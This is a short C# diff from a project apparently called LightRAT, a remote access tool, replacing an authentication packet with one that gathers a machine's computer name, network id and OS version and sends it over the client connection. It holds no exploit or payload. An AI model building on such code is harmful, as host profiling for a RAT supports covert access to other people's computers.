@@ -1,14 +1,14 @@
 ﻿using System;
 using System.Threading.Tasks;
-using LightRAT.Data;
 
 namespace LightRAT.Network.Packets
 {
     [Serializable]
-    public class AuthenticationPacket : IPacket
+    public class InformationPacket : IPacket
     {
-        public Account Account { get; set; }
-
+        public string ComputerName { get; set; }
+        public string NetworkId { get; set; }
+        public string OSVersion { get; set; }
         public async Task Execute(Client client)
         {
             await client.SendPacket(this);
